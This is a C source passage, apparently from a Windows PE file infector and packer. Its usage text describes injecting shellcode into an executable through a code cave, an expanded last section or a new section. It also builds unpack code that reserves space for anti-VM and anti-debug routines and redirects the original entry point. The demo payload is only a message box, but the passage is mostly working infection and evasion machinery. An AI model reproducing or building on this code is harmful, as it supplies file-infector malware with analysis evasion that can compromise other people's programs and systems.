    ShellParam.PositionOfSetText       = POS_SET_TEXT_STABLE;
    ShellParam.PositionOfJmp           = POS_JMP_STABLE;
    ShellParam.PositionOfMesBoxVersion = POS_SET_MESBOX_VERSION_STABLE;
    ShellParam.Caption = CAPTION_;
    ShellParam.Text    = TEXT_;

    itoa(rand() * rand(), tmpOutFileName, 10);
    adjustShellCode(CurrentInputFileName, tmpOutFileName, Mode, MesBoxVersion, &ShellParam);
    remove(CurrentInputFileName);
    strcpy(CurrentInputFileName, tmpOutFileName);

    printf("\nGenerating unpack code...\n");
    // Parameters of unpack
    UNPACK_CODE_PARAM UnpackParam;
    memset(&UnpackParam, 0, sizeof(SHELL_CODE_PARAM));

    DWORD PlaceHoldForOtherCode = 22 + 15 + 33; // Anti-VM, Anti-Debug code
    UnpackParam.PosOfSetStartOfShellAddr = PlaceHoldForOtherCode +  9;
    UnpackParam.PosOfSetSizeOfShellAddr  = PlaceHoldForOtherCode + 16;

    UnpackParam.PosOfSetPosOfCap     = PlaceHoldForOtherCode + 23;
    UnpackParam.PosOfSetPosOfText    = PlaceHoldForOtherCode + 30;
    UnpackParam.PosOfSetPosOfDLLName = PlaceHoldForOtherCode + 37;
         
    UnpackParam.PosOfSetPosOfSetCap      = PlaceHoldForOtherCode + 44;
    UnpackParam.PosOfSetPosOfSetText     = PlaceHoldForOtherCode + 51;
    UnpackParam.PosOfSetPosOfSetDLLName  = PlaceHoldForOtherCode + 58;
    UnpackParam.PosOfSetPosOfCallLoadLib = PlaceHoldForOtherCode + 65;
    UnpackParam.PosOfSetPosOfCallGetProc = PlaceHoldForOtherCode + 72;
    UnpackParam.PosOfSetPosOfJmp         = PlaceHoldForOtherCode + 79;

    UnpackParam.PosOfSetOEP        = PlaceHoldForOtherCode + 86;
    UnpackParam.PosOfSetLoadLibVA  = PlaceHoldForOtherCode + 93;
    UnpackParam.PosOfSetGetProcVA  = PlaceHoldForOtherCode + 100;
    UnpackParam.PosOfSetMSVCRTDLLName    = PlaceHoldForOtherCode + 107;
    UnpackParam.PosOfSetKERNELDLLName    = PlaceHoldForOtherCode + 114;
    
    UnpackParam.PosOfCallLoadLibMSVCRT           = PlaceHoldForOtherCode + 230;
    UnpackParam.PosOfCallLoadLibKERNEL           = PlaceHoldForOtherCode + 247;
    
    UnpackParam.PosOfCallGetProcVirAlloc   = PlaceHoldForOtherCode + 274;
    UnpackParam.PosOfCallGetProcVirProtect = PlaceHoldForOtherCode + 301;
    UnpackParam.PosOfCallGetProcMemcpy     = PlaceHoldForOtherCode + 328;

    UnpackParam.PositionOfJmp = PlaceHoldForOtherCode + 770;

    adjustUnpack(CurrentInputFileName, NewFileName, MesBoxVersion, ShellParam, &UnpackParam);
    remove(CurrentInputFileName);

    return 0;
}
#endif

int main(int argc, char *argv[]){
    char USAGE[0xff0];
    char *USAGE_FORMAT = 
    "USAGE:\n"
    "\t%s [PEFile] [NewPEFile] [MODE] [MESBOXVERSION]\n"
    "OLIDGATORY ARGUMENTS:\n"
    "\tPEFile\t\tName of file which want to infect shellcode to it\n"
    "\tNewPEFile\tName of infected file\n"
    "MODE OPTIONS:\n"
    "\t-mode0\t\tInfect shellcode to a codecave (not change size of file) - By default\n"
    "\t-mode1\t\tExpand last section to infect shellcode\n"
    "\t-mode2\t\tAdd more one section to infect shellcode\n"
    "MESBOXVERSION OPTIONS:\n"
    "\t-MBA\t\tUsing MessageBoxA - By default\n"
    "\t-MBW\t\tUsing MessageBoxW\n";
    sprintf(USAGE, USAGE_FORMAT, argv[0]);

    if (argc < 3 || argc > 5){
        printf(USAGE);
        return 1;
    }

    char MesBoxVersion = 'A';
    int Mode = 0;

    if (argc > 3){
        if(memcmp("-mode", argv[3], 5) == 0){
            Mode = atoi(argv[3] + 5);
            if (Mode < 0 && Mode > 2){
                printf(USAGE);
                return 1;
            }
        }
        else if(memcmp("-MB", argv[3], 3) == 0){
            MesBoxVersion = argv[3][3];
            if (MesBoxVersion != 'A' && MesBoxVersion != 'W'){
                printf(USAGE);
                return 1;
            }
        }
        else {
            printf(USAGE);
            return 1;
        }
    }

    if (argc > 4){
        if(memcmp("-mode", argv[4], 5) == 0){
            Mode = atoi(argv[4] + 5);
            if (Mode < 0 && Mode > 2){
                printf(USAGE);
                return 1;
            }
        }
        else if(memcmp("-MB", argv[4], 3) == 0){
            MesBoxVersion = argv[4][3];
            if (MesBoxVersion != 'A' && MesBoxVersion != 'W'){
                printf(USAGE);
                return 1;
            }
        }
        else {
            printf(USAGE);
            return 1;
        }
    }
    
    if (stricmp(argv[1], argv[2]) == 0){
        printf("Input file and output file must not be the same\n");
        return 1;
    }

    srand(time(NULL));
    pack(argv[1], argv[2], Mode, MesBoxVersion);
    printf("Done~~\n");
    return 0;
}